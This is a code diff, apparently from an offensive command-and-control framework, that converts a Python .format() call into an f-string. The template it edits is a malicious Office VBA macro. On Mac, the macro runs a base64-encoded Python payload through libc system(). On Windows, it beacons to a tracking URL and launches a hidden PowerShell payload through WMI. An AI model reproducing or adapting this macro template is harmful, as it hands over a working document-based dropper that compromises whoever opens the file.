@@ -194,7 +194,7 @@ class Stager:
             poshpayload += '\n\t\tstr = str + "' + str(poshchunk)
 
         # if statements below are for loading Mac dylibs for compatibility
-        macro = """#If Mac Then
+        macro = f"""#If Mac Then
     #If VBA7 Then
         Private Declare PtrSafe Function system Lib "libc.dylib" (ByVal command As String) As Long
     #Else
@@ -220,7 +220,7 @@ End Sub
 Public Function Debugging() As Variant
     On Error Resume Next
             Dim tracking As String
-            tracking = "{}"
+            tracking = "{pixel_track_url}"
             #If Mac Then
                 'Mac Rendering
                 If Val(Application.Version) < 15 Then 'Mac Office 2011
@@ -230,7 +230,7 @@ Public Function Debugging() As Variant
                 End If
                 Dim result As Long
                 Dim str As String
-                {}
+                {pypayload}
                 'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | python3 &")
                 result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | python3 &")
             #Else
@@ -239,7 +239,7 @@ Public Function Debugging() As Variant
                 Set objWeb = CreateObject("Microsoft.XMLHTTP")
                 objWeb.Open "GET", tracking & "Windows", False
                 objWeb.send
-                {}
+                {poshpayload}
                 'MsgBox(str)
                 Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
                 Set objStartup = objWMIService.Get("Win32_ProcessStartup")
@@ -248,10 +248,6 @@ Public Function Debugging() As Variant
                 Set objProcess = GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process")
                 objProcess.Create str, Null, objConfig, intProcessID
             #End If
-End Function""".format(
-            pixel_track_url,
-            pypayload,
-            poshpayload,
-        )
+End Function"""
 
         return macro
